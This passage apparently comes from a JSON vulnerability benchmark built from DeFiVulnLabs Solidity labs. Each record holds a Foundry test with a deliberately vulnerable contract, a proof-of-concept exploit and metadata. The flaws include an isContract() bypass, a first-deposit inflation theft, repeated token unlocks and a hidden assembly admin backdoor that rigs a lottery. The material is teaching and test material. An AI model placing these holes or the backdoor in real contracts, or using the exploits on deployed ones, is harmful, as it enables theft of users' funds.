    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Array Deletion Oversight: leading to data inconsistency\n\nDescription:\nIn Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. \nWhen attempting to delete elements from an array, if the deletion process is not handled correctly, \nthe array may still retain storage space and exhibit unexpected behavior. \n\n\nMitigation:  \nOption1: By copying the last element and placing it in the position to be removed.\nOption2: By shifting them from right to left.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1677167550277509120\nhttps://blog.solidityscan.com/improper-array-deletion-82672eed8e8d\nhttps://github.com/sherlock-audit/2023-03-teller-judging/issues/88\n*/\n\ncontract ContractTest is Test {\n    ArrayDeletionBug ArrayDeletionBugContract;\n    FixedArrayDeletion FixedArrayDeletionContract;\n\n    function setUp() public {\n        ArrayDeletionBugContract = new ArrayDeletionBug();\n        FixedArrayDeletionContract = new FixedArrayDeletion();\n    }\n\n    function testArrayDeletion() public {\n        ArrayDeletionBugContract.myArray(1);\n        //delete incorrectly\n        ArrayDeletionBugContract.deleteElement(1);\n        ArrayDeletionBugContract.myArray(1);\n        ArrayDeletionBugContract.getLength();\n    }\n\n    function testFixedArrayDeletion() public {\n        FixedArrayDeletionContract.myArray(1);\n        //delete incorrectly\n        FixedArrayDeletionContract.deleteElement(1);\n        FixedArrayDeletionContract.myArray(1);\n        FixedArrayDeletionContract.getLength();\n    }\n\n    receive() external payable {}\n}\n\ncontract ArrayDeletionBug {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        delete myArray[index];\n    }\n\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n\ncontract FixedArrayDeletion {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    //Mitigation 1: By copying the last element and placing it in the position to be removed.\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n\n        // Swap the element to be deleted with the last element\n        myArray[index] = myArray[myArray.length - 1];\n\n        // Delete the last element\n        myArray.pop();\n    }\n\n    /*Mitigation 2: By shifting them from right to left.\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        \n        for (uint i = _index; i < myArray.length - 1; i++) {\n            myArray[i] = myArray[i + 1];\n        }\n        \n        // Delete the last element\n        myArray.pop();\n    }\n    */\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n",
    "vulnerable_contract_only": "contract ArrayDeletionBug {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        delete myArray[index];\n    }\n\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Array Deletion Oversight: leading to data inconsistency",
    "description": "In Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. \nWhen attempting to delete elements from an array, if the deletion process is not handled correctly, \nthe array may still retain storage space and exhibit unexpected behavior.",
    "scenario": "",
    "fix_description": "Option1: By copying the last element and placing it in the position to be removed.\nOption2: By shifting them from right to left.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/Array-deletion.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_transientstoragemisuse.t",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "TransientStorageMisuse.t.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\n/*\nSIR (Storage Injection via Reentrancy) vulnerability transient storage test\nReference: https://www.coveragelabs.io/blog/post/sir-exploit\nSolidity 0.8.24+ transient storage\n*/\n\n// Simplified transient storage vulnerability demonstration\n\ncontract SimpleVault {\n    // mint function\n    function mint(uint256 amountToDeposit) external returns (uint256) {\n        // Write vault address (address(this)) to transient storage\n        address vault = address(this);\n        assembly {\n            tstore(1, vault)\n        }\n        \n        // Directly call own callback function\n        this.SwapCallback(amountToDeposit, \"\");\n        \n    }\n    \n    // Simulate SwapCallback callback function\n    function SwapCallback(uint256 amount ,bytes calldata data) external {\n        // Read vault address from transient storage\n        address vault;\n        assembly {\n            vault := tload(1)\n        }\n\n        // Check if caller is a legitimate vault\n        require(msg.sender == vault, \"Not authorized\");\n        \n        if (vault == address(this)) {\n            // Output vault address for observation\n            console.log(\"vault address:\", vault);\n            // Write the returned amount to transient storage\n            assembly {\n                tstore(1, amount)\n            }\n        } else {\n            console.log(\"Manipulated vault address:\", vault);\n        }\n    }\n\n}\n\ncontract TransientStorageMisuseTest is Test {\n    SimpleVault vault;\n    \n    function setUp() public {\n        vault = new SimpleVault();\n    }\n\n\n    function testStorageExploit() public {\n        // First, let's check what address we want to get\n        console.log(\"Target address:\", address(this));\n        \n        // Convert the address to uint256\n        uint256 amount = uint256(uint160(address(this)));\n        emit log_named_uint(\"Amount needed\", amount);\n        \n        // Now use this amount in the mint function\n        vault.mint(amount);\n        // Exploit callback\n        vault.SwapCallback(0, \"\");\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleVault {\n    // mint function\n    function mint(uint256 amountToDeposit) external returns (uint256) {\n        // Write vault address (address(this)) to transient storage\n        address vault = address(this);\n        assembly {\n            tstore(1, vault)\n        }\n        \n        // Directly call own callback function\n        this.SwapCallback(amountToDeposit, \"\");\n        \n    }\n    \n    // Simulate SwapCallback callback function\n    function SwapCallback(uint256 amount ,bytes calldata data) external {\n        // Read vault address from transient storage\n        address vault;\n        assembly {\n            vault := tload(1)\n        }\n\n        // Check if caller is a legitimate vault\n        require(msg.sender == vault, \"Not authorized\");\n        \n        if (vault == address(this)) {\n            // Output vault address for observation\n            console.log(\"vault address:\", vault);\n            // Write the returned amount to transient storage\n            assembly {\n                tstore(1, amount)\n            }\n        } else {\n            console.log(\"Manipulated vault address:\", vault);\n        }\n    }\n\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "SIR (Storage Injection via Reentrancy) vulnerability transient storage test",
    "description": "SIR (Storage Injection via Reentrancy) vulnerability transient storage test",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/TransientStorageMisuse.t.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_bypasscontract",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Bypasscontract.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Bypass isContract() validation\n\nDescription:\nThe attacker only needs to write the code in the constructor of the smart contract \nto bypass the detection mechanism of whether it is a smart contract.\n\nREF:\nhttps://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/\n*/\n\ncontract ContractTest is Test {\n    Target TargetContract;\n    FailedAttack FailedAttackContract;\n    Attack AttackerContract;\n    TargetRemediated TargetRemediatedContract;\n\n    constructor() {\n        TargetContract = new Target();\n        FailedAttackContract = new FailedAttack();\n        TargetRemediatedContract = new TargetRemediated();\n    }\n\n    function testBypassFailedContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit Failed\");\n        FailedAttackContract.pwn(address(TargetContract));\n    }\n\n    function testBypassContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        AttackerContract = new Attack(address(TargetContract));\n        console.log(\n            \"After exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n\ncontract FailedAttack is Test {\n    // Attempting to call Target.protected will fail,\n    // Target block calls from contract\n    function pwn(address _target) external {\n        // This will fail\n        vm.expectRevert(\"no contract allowed\");\n        Target(_target).protected();\n    }\n}\n\ncontract Attack {\n    bool public isContract;\n    address public addr;\n\n    // When contract is being created, code size (extcodesize) is 0.\n    // This will bypass the isContract() check\n    constructor(address _target) {\n        isContract = Target(_target).isContract(address(this));\n        addr = address(this);\n        // This will work\n        Target(_target).protected();\n    }\n}\n\ncontract TargetRemediated {\n    function isContract(address account) public view returns (bool) {\n        require(tx.origin == msg.sender);\n        return account.code.length > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n",
    "vulnerable_contract_only": "contract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "contract_check_bypass",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Bypass isContract() validation",
    "description": "The attacker only needs to write the code in the constructor of the smart contract \nto bypass the detection mechanism of whether it is a smart contract.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/Bypasscontract.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_backdoor-assembly",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Backdoor-assembly.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/* \nName: Hidden Backdoor in Contract:\n\nDescription:\nIn this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow \na hidden privilege to the contract deployer/administrator. \nThis is achieved through the use of assembly level access to storage variables, \nwhere a referee function is designed to provide an administrative backdoor. \nThe 'pickWinner' function appears to randomly pick a winner, but in reality,\nit allows the administrator to set the winner. \nThis bypasses the usual access controls and can be used to drain the prize pool \nby an unauthorized user, acting as a type of rug pull.\n\nAn attacker can manipulate smart contracts as a backdoor by writing inline assembly. \nAny sensitive parameters can be changed at any time.\n\nScenario:\nLottery game: anyone can call pickWinner to get prize if you are lucky. \nRefers to JST contract backdoor. many rugged style's contract has similar pattern.\nLooks like theres is no setwinner function in contract, how admin can rug?\n*/\n\ncontract ContractTest is Test {\n    LotteryGame LotteryGameContract;\n\n    function testBackdoorCall() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        LotteryGameContract = new LotteryGame();\n        console.log(\n            \"Alice performs pickWinner, of course she will not be a winner\"\n        );\n        vm.prank(alice);\n        LotteryGameContract.pickWinner(address(alice));\n        console.log(\"Prize: \", LotteryGameContract.prize());\n\n        console.log(\"Now, admin sets the winner to drain out the prize.\");\n        LotteryGameContract.pickWinner(address(bob));\n        console.log(\"Admin manipulated winner: \", LotteryGameContract.winner());\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract LotteryGame {\n    uint256 public prize = 1000;\n    address public winner;\n    address public admin = msg.sender;\n\n    modifier safeCheck() {\n        if (msg.sender == referee()) {\n            _;\n        } else {\n            getkWinner();\n        }\n    }\n\n    function referee() internal view returns (address user) {\n        assembly {\n            // load admin value at slot 2 of storage\n            user := sload(2)\n        }\n    }\n\n    function pickWinner(address random) public safeCheck {\n        assembly {\n            // admin backddoor which can set winner address\n            sstore(1, random)\n        }\n    }\n\n    function getkWinner() public view returns (address) {\n        console.log(\"Current winner: \", winner);\n        return winner;\n    }\n}\n",
    "vulnerable_contract_only": "contract LotteryGame {\n    uint256 public prize = 1000;\n    address public winner;\n    address public admin = msg.sender;\n\n    modifier safeCheck() {\n        if (msg.sender == referee()) {\n            _;\n        } else {\n            getkWinner();\n        }\n    }\n\n    function referee() internal view returns (address user) {\n        assembly {\n            // load admin value at slot 2 of storage\n            user := sload(2)\n        }\n    }\n\n    function pickWinner(address random) public safeCheck {\n        assembly {\n            // admin backddoor which can set winner address\n            sstore(1, random)\n        }\n    }\n\n    function getkWinner() public view returns (address) {\n        console.log(\"Current winner: \", winner);\n        return winner;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "backdoor",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Hidden Backdoor in Contract:",
    "description": "In this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow \na hidden privilege to the contract deployer/administrator. \nThis is achieved through the use of assembly level access to storage variables, \nwhere a referee function is designed to provide an administrative backdoor. \nThe 'pickWinner' function appears to randomly pick a winner, but in reality,\nit allows the administrator to set the winner. \nThis bypasses the usual access controls and can be used to drain the prize pool \nby an unauthorized user, acting as a type of rug pull.\n\nAn attacker can manipulate smart contracts as a backdoor by writing inline assembly. \nAny sensitive parameters can be changed at any time.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Backdoor-assembly.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_first-deposit",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "first-deposit.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\n\nName: First deposit bug\n\nDescription:\nFirst pool depositor can be front-run and have part of their deposit stolen\nIn this case, we can control the variable \"_supplied.\" \nBy depositing a small amount of loan tokens to obtain pool tokens, \nwe can front-run other depositors' transactions and inflate the price of pool tokens through a substantial \"donation.\"\nConsequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.\n\nThis calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,\nit is essentially rounded down to 0.\n\nMitigation:  \nConsider minting a minimal amount of pool tokens during the first deposit \nand sending them to zero address, this increases the cost of the attack. \nUniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. \nThe same can be done in this case i.e. when totalSupply() == 0, \nsend the first min liquidity LP tokens to the zero address to enable share dilution.\n\nREF:\nhttps://defihacklabs.substack.com/p/solidity-security-lesson-2-first\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/1\nhttps://github.com/transmissions11/solmate/issues/178\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n    MyToken MyTokenContract;\n\n    function setUp() public {\n        MyTokenContract = new MyToken();\n        SimplePoolContract = new SimplePool(address(MyTokenContract));\n    }\n\n    function testFirstDeposit() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        MyTokenContract.transfer(alice, 1 ether + 1);\n        MyTokenContract.transfer(bob, 2 ether);\n\n        vm.startPrank(alice);\n        // Alice deposits 1 wei, gets 1 pool token\n        MyTokenContract.approve(address(SimplePoolContract), 1);\n        SimplePoolContract.deposit(1);\n\n        // Alice transfers 1 ether to the pool, inflating the pool token price\n        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);\n\n        vm.stopPrank();\n        vm.startPrank(bob);\n        // Bob deposits 2 ether, gets 1 pool token due to inflated price\n        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;\n        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.\n        MyTokenContract.approve(address(SimplePoolContract), 2 ether);\n        SimplePoolContract.deposit(2 ether);\n        vm.stopPrank();\n        vm.startPrank(alice);\n\n        MyTokenContract.balanceOf(address(SimplePoolContract));\n\n        // Alice withdraws and gets 1.5 ether, making a profit\n        SimplePoolContract.withdraw(1);\n        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);\n        console.log(\"Alice balance\", MyTokenContract.balanceOf(alice));\n    }\n\n    receive() external payable {}\n}\n\ncontract MyToken is ERC20, Ownable {\n    constructor() ERC20(\"MyToken\", \"MTK\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public loanToken;\n    uint public totalShares;\n\n    mapping(address => uint) public balanceOf;\n\n    constructor(address _loanToken) {\n        loanToken = IERC20(_loanToken);\n    }\n\n    function deposit(uint amount) external {\n        require(amount > 0, \"Amount must be greater than zero\");\n\n        uint _shares;\n        if (totalShares == 0) {\n            _shares = amount;\n        } else {\n            _shares = tokenToShares(\n                amount,\n                loanToken.balanceOf(address(this)),\n                totalShares,\n                false\n            );\n        }\n\n        require(\n            loanToken.transferFrom(msg.sender, address(this), amount),\n            \"TransferFrom failed\"\n        );\n        balanceOf[msg.sender] += _shares;\n        totalShares += _shares;\n    }\n\n    function tokenToShares(\n        uint _tokenAmount,\n        uint _supplied,\n        uint _sharesTotalSupply,\n        bool roundUpCheck\n    ) internal pure returns (uint) {\n        if (_supplied == 0) return _tokenAmount;\n        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;\n        if (\n            roundUpCheck &&\n            shares * _supplied < _tokenAmount * _sharesTotalSupply\n        ) shares++;\n        return shares;\n    }\n\n    function withdraw(uint shares) external {\n        require(shares > 0, \"Shares must be greater than zero\");\n        require(balanceOf[msg.sender] >= shares, \"Insufficient balance\");\n\n        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /\n            totalShares;\n\n        balanceOf[msg.sender] -= shares;\n        totalShares -= shares;\n\n        require(loanToken.transfer(msg.sender, tokenAmount), \"Transfer failed\");\n    }\n}\n",
    "vulnerable_contract_only": "contract MyToken {\n    constructor() ERC20(\"MyToken\", \"MTK\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "inflation_attack",
    "severity": "medium",
    "difficulty_tier": 4,
    "vulnerability_name": "First deposit bug",
    "description": "First pool depositor can be front-run and have part of their deposit stolen\nIn this case, we can control the variable \"_supplied.\" \nBy depositing a small amount of loan tokens to obtain pool tokens, \nwe can front-run other depositors' transactions and inflate the price of pool tokens through a substantial \"donation.\"\nConsequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.\n\nThis calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,\nit is essentially rounded down to 0.",
    "scenario": "",
    "fix_description": "Consider minting a minimal amount of pool tokens during the first deposit \nand sending them to zero address, this increases the cost of the attack. \nUniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. \nThe same can be done in this case i.e. when totalSupply() == 0, \nsend the first min liquidity LP tokens to the zero address to enable share dilution.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/first-deposit.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_incorrect_sanity_checks",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Incorrect_sanity_checks.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse \n\nDescription:\nThe bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. \nThis allows tokens to be unlocked multiple times before the lock period has elapsed, \npotentially leading to significant financial loss.\n \nMitigation:  \nAdd a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.\n\nor fix:\nuint256 amount = locker.amount;\nif (block.timestamp > locker.lockTime) {\n    IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    locker.amount = 0;\n    }\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1681492477281468420\nhttps://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d\n*/\n\ncontract ContractTest is Test {\n    VulnerableBank VulnerableBankContract;\n    BanksLP BanksLPContract;\n    FixedeBank FixedeBankContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        VulnerableBankContract = new VulnerableBank();\n        FixedeBankContract = new FixedeBank();\n        BanksLPContract = new BanksLP();\n        BanksLPContract.transfer(address(alice), 10000);\n        BanksLPContract.transfer(address(VulnerableBankContract), 100000);\n    }\n\n    function testVulnerableBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(VulnerableBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        VulnerableBankContract.createLocker(\n            address(BanksLPContract),\n            10000,\n            86400\n        );\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //vm.warp(88888);\n        //exploit it,\n        for (uint i = 0; i < 10; i++) {\n            VulnerableBankContract.unlockToken(1);\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n\n    function testFixedBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(FixedeBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        FixedeBankContract.createLocker(address(BanksLPContract), 10000, 86400);\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //exploit it, failed.\n        for (uint i = 0; i < 10; i++) {\n            {\n                vm.expectRevert();\n                FixedeBankContract.unlockToken(1);\n            }\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n}\n\ncontract VulnerableBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n        require(locker.hasLockedTokens, \"No locked tokens\");\n\n        // Incorrect sanity checks.\n        if (block.timestamp > locker.lockTime) {\n            locker.amount = 0;\n        }\n\n        // Transfer tokens to the locker owner\n        // This is where the exploit happens, as this can be called multiple times\n        // before the lock time has elapsed.\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n\ncontract BanksLP is ERC20, Ownable {\n    constructor() ERC20(\"BanksLP\", \"BanksLP\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract FixedeBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n\n        require(locker.hasLockedTokens, \"No locked tokens\");\n        require(block.timestamp > locker.lockTime, \"Tokens are still locked\");\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n\n        // Mark the tokens as unlocked\n        locker.hasLockedTokens = false;\n        locker.amount = 0;\n\n        // Transfer tokens to the locker owner\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract VulnerableBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse",
    "description": "The bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. \nThis allows tokens to be unlocked multiple times before the lock period has elapsed, \npotentially leading to significant financial loss.",
    "scenario": "",
    "fix_description": "Add a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.\n\nor fix:\nuint256 amount = locker.amount;\nif (block.timestamp > locker.lockTime) {\n    IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    locker.amount = 0;\n    }",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/Incorrect_sanity_checks.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_return-break",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "return-break.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Use of return in inner loop iteration leads to unintended termination. \n\nDescription:\nThis demonstrates the difference between using 'return' and 'break' in nested loop iterations.\nWhen removing multiple banks from a list, using 'return' in the BuggyBankManager will prematurely exit the function\nafter removing only the first bank, leaving other banks untouched.\nIn contrast, the FixedBankManager uses 'break' correctly to only exit the current inner loop iteration,\nallowing the outer loop to continue processing other banks.\n\nThis is similar to a real bug where a function intended to allow the removal of multiple DEXes approved for swaps,\nbut would only remove the first DEX because 'return' was used instead of 'break' in the inner for loop.\n\nMitigation:  \nUse break instead of return when you only want to exit the current loop, not the entire function.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678596730865221632\nhttps://github.com/code-423n4/2022-03-lifinance-findings/issues/34\nhttps://solidity-by-example.org/loop/\n*/\n\ncontract ContractTest is Test {\n    BuggyBankManager buggyManager;\n    FixedBankManager fixedManager;\n\n    function setUp() public {\n        buggyManager = new BuggyBankManager();\n        fixedManager = new FixedBankManager();\n        \n        // Initialize both managers with the same 3 banks\n        address[] memory initialBanks = new address[](3);\n        string[] memory initialNames = new string[](3);\n        \n        initialBanks[0] = address(0x1);\n        initialNames[0] = \"ABC Bank\";\n        \n        initialBanks[1] = address(0x2);\n        initialNames[1] = \"XYZ Bank\";\n        \n        initialBanks[2] = address(0x3);\n        initialNames[2] = \"Global Bank\";\n        \n        buggyManager.addBanks(initialBanks, initialNames);\n        fixedManager.addBanks(initialBanks, initialNames);\n        \n        // Verify initial state\n        emit log_string(\"Initial state of both bank managers:\");\n        emit log_named_uint(\"Buggy manager bank count\", buggyManager.getBankCount());\n        emit log_named_uint(\"Fixed manager bank count\", fixedManager.getBankCount());\n    }\n\n    function testReturnVsBreak() public {\n        // Try to remove all banks marked for removal\n        emit log_string(\"\\nRemoving banks marked for removal\");\n        \n        // Mark all banks for removal\n        address[] memory banksToRemove = new address[](3);\n        banksToRemove[0] = address(0x1); // ABC Bank\n        banksToRemove[1] = address(0x2); 